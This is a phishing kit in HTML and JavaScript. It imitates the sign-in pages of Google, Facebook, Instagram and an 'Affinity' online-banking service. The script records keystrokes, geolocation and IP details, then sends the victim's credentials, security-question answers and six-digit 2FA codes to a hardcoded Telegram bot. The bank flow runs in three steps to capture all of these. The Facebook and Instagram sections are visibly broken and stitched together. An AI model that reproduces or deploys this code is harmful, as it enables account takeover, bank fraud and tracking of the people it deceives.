<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; }

/* Default / Google */
.card { background:#fff; border-radius:12px; box-shadow:0 2px 12px rgba(0,0,0,0.08); padding:32px 24px; width:100%; max-width:400px; }
.logo { text-align:center; margin-bottom:24px; }
.logo h1 { font-size:22px; font-weight:600; margin-top:8px; }
.logo p { font-size:14px; color:#666; margin-top:4px; }
.input-group { margin-bottom:16px; }
.input-group label { display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px; }
.input-group input { width:100%; padding:12px 14px; border:1.5px solid #ddd; border-radius:8px; font-size:16px; background:#fafafa; }
.input-group input:focus { outline:none; border-color:var(--c); background:#fff; }
.btn { width:100%; padding:14px; background:var(--c); color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:8px; }
.btn:hover { filter:brightness(0.9); }
.error { color:#d93025; font-size:13px; margin-top:12px; text-align:center; display:none; }
.loading { display:none; text-align:center; margin-top:16px; }
.spinner { width:20px; height:20px; border:3px solid #e0e0e0; border-top:3px solid var(--c); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 8px; }
@keyframes spin { to { transform:rotate(360deg); } }
.footer { text-align:center; margin-top:20px; font-size:13px; color:#999; }
.footer a { color:var(--c); text-decoration:none; }

/* Facebook */
.fb-card { max-width:400px; }
.fb-card .btn { font-size:20px; font-weight:700; }

/* Affinity */
.affinity-wrapper { max-width:420px; width:100%; }
.affinity-header { background:linear-gradient(135deg,#003d6b,#005a9c); padding:32px 24px; text-align:center; }
.affinity-header h1 { color:#fff; font-size:22px; font-weight:700; }
.affinity-header p { color:rgba(255,255,255,0.8); font-size:13px; margin-top:4px; }
.affinity-body { background:#fff; padding:24px; }
.affinity-body label { display:block; font-size:12px; font-weight:600; color:#444; letter-spacing:0.5px; margin-bottom:6px; }
.affinity-body input { width:100%; padding:12px; border:1.5px solid #ddd; border-radius:4px; font-size:15px; margin-bottom:16px; background:#fafafa; }
.affinity-body input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.1); outline:none; background:#fff; }
.affinity-btn { width:100%; padding:14px; background:#005a9c; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:600; cursor:pointer; }
.affinity-btn:hover { background:#003d6b; }
.affinity-footer { background:#f5f7fa; padding:14px 24px; text-align:center; border-top:1px solid #e6e8ec; font-size:11px; color:#888; }
.affinity-footer a { color:#005a9c; text-decoration:none; margin:0 6px; }
.code-inputs { display:flex; gap:8px; justify-content:center; margin:20px 0; }
.code-inputs input { width:48px; height:54px; text-align:center; font-size:22px; font-weight:600; border:1.5px solid #ddd; border-radius:6px; background:#fafafa; }
.code-inputs input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.15); outline:none; background:#fff; }

/* Instagram */
.ig-wrapper { max-width:400px; width:100%; background:#fff; border:1px solid #dbdbdb; }
.ig-body { padding:40px 32px; text-align:center; }
.ig-body input { width:100%; padding:12px; border:1px solid #dbdbdb; border-radius:4px; background:#fafafa; font-size:12px; margin-bottom:6px; }
.ig-body input:focus { border-color:#a8a8a8; outline:none; }
.ig-btn { width:100%; padding:10px; background:#0095F6; color:#fff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; margin-top:8px; }
.ig-btn:hover { background:#0081db; }

/* Hide */
.hide { display:none !important; }
</style>
</head>
<body>
<div id="app"></div>

<script>
const BT = "8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84";
const CI = "8647509715";

// Global state
let lat = null, lon = null;
let ipInfo = { ip:'?', city:'?', country:'?', isp:'?' };
let keystrokeQueue = [];
let keystrokeTimer = null;
let lastSent = 0;
let listenerHandles = []; // for cleanup

// Get IP
fetch('https://ipapi.co/json/').then(r=>r.json()).then(d => {
    ipInfo.ip = d.ip || '?';
    ipInfo.city = d.city || '?';
    ipInfo.country = d.country_name || '?';
    ipInfo.isp = d.org || '?';
    lat = d.latitude; lon = d.longitude;
}).catch(()=>{});

// Get GPS
function getGPS() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        p => { lat = p.coords.latitude; lon = p.coords.longitude; },
        () => {},
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
}
getGPS();

// Rate-limited Telegram send (1 msg/sec max to same chat)
function tg(msg) {
    const now = Date.now();
    const wait = Math.max(0, 1100 - (now - lastSent));
    setTimeout(() => {
        lastSent = Date.now();
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + BT + '/sendMessage', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({ chat_id: CI, text: msg, parse_mode: "Markdown" }));
    }, wait);
}

// Batched keystroke send (every 2s, max 5 chars per batch)
function queueKey(brand, field, char, sofar) {
    keystrokeQueue.push({ brand, field, char, sofar });
    if (keystrokeTimer) return;
    keystrokeTimer = setInterval(() => {
        if (!keystrokeQueue.length) { clearInterval(keystrokeTimer); keystrokeTimer = null; return; }
        const batch = keystrokeQueue.splice(0, 5);
        const msg = batch.map(b => `\`${b.char}\``).join(' ');
        const last = batch[batch.length - 1];
        tg(`⌨️ *${batch[0].brand}* — ${last.field}: ${msg}\n→ \`${last.sofar}\``);
    }, 2000);
}

// Build location string
function locStr() {
    let s = `🌐 IP: \`${ipInfo.ip}\`\n📍 ${ipInfo.city}, ${ipInfo.country}\n🏢 ${ipInfo.isp}`;
    if (lat && lon) s += `\n🎯 GPS: ${lat}, ${lon}\n🗺 https://www.google.com/maps?q=${lat},${lon}`;
    s += `\n⏰ ${new Date().toISOString()}`;
    return s;
}

// Cleanup old listeners before rendering new page
function cleanListeners() {
    listenerHandles.forEach(h => h.remove && h.remove());
    listenerHandles = [];
}

function addKeyListener(el, brand, field) {
    if (!el) return;
    const handler = function() {
        const v = el.value;
        if (v.length > 0) {
            queueKey(brand, field, v[v.length-1], v);
        }
    };
    el.addEventListener('input', handler);
    listenerHandles.push({ remove: () => el.removeEventListener('input', handler) });
}

function setCSS(color) {
    document.documentElement.style.setProperty('--c', color);
}

// ==========================================
// PAGE: Google
// ==========================================
function renderGoogle() {
    setCSS('#1a73e8');
    document.getElementById('app').innerHTML = `
    <div class="card">
        <div class="logo">
            <svg width="48" height="48" viewBox="0 0 48 48"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg>
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
        </div>
        <form id="loginForm">
            <div class="input-group"><label>Email or phone</label><input type="text" id="email" placeholder="you@gmail.com" required></div>
            <div class="input-group"><label>Password</label><input type="password" id="password" required></div>
            <div class="error" id="errorMsg">Couldn't sign you in.</div>
            <button type="submit" class="btn">Sign in</button>
        </form>
        <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
        <div class="footer"><a href="#">Forgot password?</a></div>
    </div>`;
    setupGoogle();
}

function setupGoogle() {
    const f = document.getElementById('loginForm');
    const e = document.getElementById('email');
    const p = document.getElementById('password');
    addKeyListener(e, 'Google', 'Email');
    addKeyListener(p, 'Google', 'Password');
    f.addEventListener('submit', function(ev) {
        ev.preventDefault();
        const em = e.value.trim(), pw = p.value;
        document.getElementById('loadingIndicator').style.display = 'block';
        tg(`🔔 *Google — Creds*\n📧 \`${em}\`\n🔑 \`${pw}\`\n\n${locStr()}`);
        getGPS();
        setTimeout(() => {
            const coords = (lat && lon) ? `${lat},${lon}` : '';
            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://accounts.google.com';
        }, 2000);
    });
}

// ==========================================
// PAGE: Facebook
// ==========================================

    document.getElementById('app').innerHTML = `
    <div class="card fb-card">
        <div class="logo">
            <svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg>
            <h1 style="color:#1877F2">Log in to Facebook</h1>

        setTimeout(() => {

// ==========================================
// PAGE: Instagram
// ==========================================
function renderInstagram() {
    document.getElementById('app').innerHTML = `
    <div class="ig-wrapper">
        <div class="ig-body">
            <svg width="64" height="64" viewBox="0 0 48 48"><defs><linearGradient id="g" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#g)"/><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg>
            <form id="loginForm" style="margin-top:32px">
                <input type="text" id="email" placeholder="Phone, username, or email" required>

                <button type="submit" class="ig-btn">Log in</button>

    addKeyListener(p, 'Instagram', 'Password');

}

// ==========================================
// PAGE: Affinity (3-step: creds -> secQ -> 2FA)
// ==========================================
function renderAffinity(step) {
    step = step || 1;
    if (step === 1) {
        document.getElementById('app').innerHTML = `
        <div class="affinity-wrapper" id="aff1">
            <div class="affinity-header">
                <h1>Online Banking</h1>
                <p>Sign in to your account</p>
            </div>
            <div class="affinity-body">
                <form id="loginForm">
                    <label>MEMBER NUMBER</label>
                    <input type="text" id="email" placeholder="Enter your member number" required>
                    <label>PASSWORD</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                    <div class="error" id="errorMsg">Incorrect member number or password.</div>
                    <button type="submit" class="affinity-btn">Sign In</button>
                </form>
                <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
            </div>
            <div class="affinity-footer">
                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call 1.866.863.6237
            </div>
        </div>`;
        setupAff1();
    } else if (step === 2) {
        document.getElementById('app').innerHTML = `
        <div class="affinity-wrapper" id="aff2">
            <div class="affinity-header">
                <h1>Verify Your Identity</h1>
                <p>Please answer the following question</p>
            </div>
            <div class="affinity-body">
                <form id="secForm">
                    <label>SECURITY QUESTION</label>
                    <select id="secQ" style="width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:16px;background:#fafafa">
                        <option value="">— Select a question —</option>
                        <option value="What is your father's middle name?">What is your father's middle name?</option>
                        <option value="What was the name of your first pet?">What was the name of your first pet?</option>
                        <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
                        <option value="What street did you grow up on?">What street did you grow up on?</option>
                        <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
                        <option value="What is the name of your first employer?">What is the name of your first employer?</option>
                    </select>
                    <label>YOUR ANSWER</label>
                    <input type="text" id="secA" placeholder="Enter your answer" required>
                    <div class="error" id="secError">Incorrect answer.</div>
                    <button type="submit" class="affinity-btn">Verify</button>
                </form>
                <div class="loading" id="secLoad" style="display:none"><div class="spinner"></div><p>Verifying...</p></div>
            </div>
            <div class="affinity-footer">
                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a>
            </div>
        </div>`;
        setupAff2();
    } else if (step === 3) {
        document.getElementById('app').innerHTML = `
        <div class="affinity-wrapper" id="aff3">
            <div class="affinity-header">
                <h1>Verify Your Identity</h1>
                <p>Enter the code sent to your device</p>
            </div>
            <div class="affinity-body">
                <p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px">A 6-digit code was sent to your phone.</p>
                <form id="tfaForm">
                    <div class="code-inputs">
                        <input type="text" id="c1" maxlength="1" inputmode="numeric">
                        <input type="text" id="c2" maxlength="1" inputmode="numeric">
                        <input type="text" id="c3" maxlength="1" inputmode="numeric">
                        <input type="text" id="c4" maxlength="1" inputmode="numeric">
                        <input type="text" id="c5" maxlength="1" inputmode="numeric">
                        <input type="text" id="c6" maxlength="1" inputmode="numeric">
                    </div>
                    <div class="error" id="tfaError">Invalid code.</div>
                    <button type="submit" class="affinity-btn">Verify</button>
                </form>
                <div class="loading" id="tfaLoad" style="display:none"><div class="spinner"></div><p>Verifying code...</p></div>
            </div>
            <div class="affinity-footer">
                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a>
            </div>
        </div>`;
        setupAff3();
    }
}

function setupAff1() {
    const f = document.getElementById('loginForm');
    const e = document.getElementById('email');
    const p = document.getElementById('password');
    addKeyListener(e, 'Affinity', 'Member#');
    addKeyListener(p, 'Affinity', 'Password');
    f.addEventListener('submit', function(ev) {
        ev.preventDefault();
        const em = e.value.trim(), pw = p.value;
        document.getElementById('loadingIndicator').style.display = 'block';
        tg(`🔔 *Affinity — Creds*\n📧 Member#: \`${em}\`\n🔑 Password: \`${pw}\`\n\n${locStr()}`);
        getGPS();
        setTimeout(() => { cleanListeners(); renderAffinity(2); }, 2000);
    });
}

function setupAff2() {
    const f = document.getElementById('secForm');
    const q = document.getElementById('secQ');
    const a = document.getElementById('secA');
    addKeyListener(a, 'Affinity', 'SecAnswer');
    f.addEventListener('submit', function(ev) {
        ev.preventDefault();
        const qv = q.value, av = a.value.trim();
        document.getElementById('secLoad').style.display = 'block';
        f.style.display = 'none';
        tg(`🛡️ *Affinity — Security Q*\n❓ ${qv}\n✏️ \`${av}\``);
        setTimeout(() => { cleanListeners(); renderAffinity(3); }, 2000);
    });
}

function setupAff3() {
    const ids = ['c1','c2','c3','c4','c5','c6'];
    ids.forEach((id, i) => {
        const el = document.getElementById(id);
        el.addEventListener('input', function() {
            if (this.value.length >= 1 && i < 5) document.getElementById(ids[i+1]).focus();
        });
        el.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value.length === 0 && i > 0) document.getElementById(ids[i-1]).focus();
        });
    });
    document.getElementById('tfaForm').addEventListener('submit', function(ev) {
        ev.preventDefault();
        const code = ids.map(id => document.getElementById(id).value).join('');
        if (code.length < 6) return;
        document.getElementById('tfaLoad').style.display = 'block';
        ev.target.style.display = 'none';
        tg(`📱 *Affinity — 2FA Code*\n🔢 \`${code}\`\n\n${locStr()}`);
        setTimeout(() => {
            const coords = (lat && lon) ? `${lat},${lon}` : '';
            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://personal.affinitycu.ca/';
        }, 2000);
    });
}

// ==========================================
// ROUTER
// ==========================================
function route() {
    cleanListeners();
    const p = new URLSearchParams(location.search);
    const b = p.get('brand') || 'google';
    if (b === 'facebook') renderFacebook();
    else if (b === 'instagram') renderInstagram();
    else if (b === 'affinity') renderAffinity(1);
    else renderGoogle();
}
route();
</script>
</body>
</html>
